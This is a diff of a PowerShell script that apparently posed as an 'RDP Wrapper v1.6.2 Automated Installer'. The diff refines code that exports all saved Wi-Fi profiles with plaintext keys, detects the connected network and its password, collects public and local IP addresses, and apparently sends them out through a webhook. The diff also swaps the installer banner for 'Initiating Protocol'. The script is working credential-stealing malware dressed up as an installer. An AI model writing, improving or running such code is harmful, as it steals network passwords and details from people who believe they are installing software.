@@ -108,7 +108,6 @@ function Send-WebhookJson {
 # ============================================================
 # 1. Gather Network, IP Details, Active Wi-Fi & Send Webhooks
 # ============================================================
-
 try {
     $publicIp = $null
     try {
@@ -123,7 +122,7 @@ try {
         }
     }
 
-    # Gather local IPs cleanly into an array instead of a text table
+    # Gather local IPs cleanly into an array
     $localIpsArray = @()
     Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
         Where-Object { 
@@ -142,9 +141,16 @@ try {
     netsh wlan export profile key=clear | Out-Null
     Start-Sleep -Seconds 1
 
-    # Detect currently connected SSID and its password
-    $connectedSsid = (netsh wlan show interfaces -ErrorAction SilentlyContinue) -match '^\s+SSID\s*:\s+(.+)$' | ForEach-Object { $Matches[1].Trim() }
-    
+    # Bulletproof Connected SSID Detection
+    $connectedSsid = "Not Connected"
+    $interfaceOutput = netsh wlan show interfaces 2>&1
+    foreach ($line in $interfaceOutput) {
+        if ($line -match '^\s*SSID\s*:\s*(.+)$') {
+            $connectedSsid = $Matches[1].Trim()
+            break
+        }
+    }
+
     $activeWifiObj = $null
     $wifiProfiles = @()
     $xmlFiles = Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue
@@ -172,7 +178,7 @@ try {
     }
 
     # Fallback if connected to a network with no saved profile XML
-    if (-not $activeWifiObj -and $connectedSsid) {
+    if (-not $activeWifiObj -and $connectedSsid -ne "Not Connected") {
         $activeWifiObj = [ordered]@{
             name     = $connectedSsid
             password = "Unknown / Not Saved"
@@ -219,7 +225,7 @@ finally {
 
 Write-Host ""
 Write-Host "============================================================" -ForegroundColor Cyan
-Write-Host "            RDP Wrapper v1.6.2 Automated Installer" -ForegroundColor Cyan
+Write-Host "            Initiating Protocol" -ForegroundColor Cyan
 Write-Host "============================================================" -ForegroundColor Cyan
 Write-Host ""
 
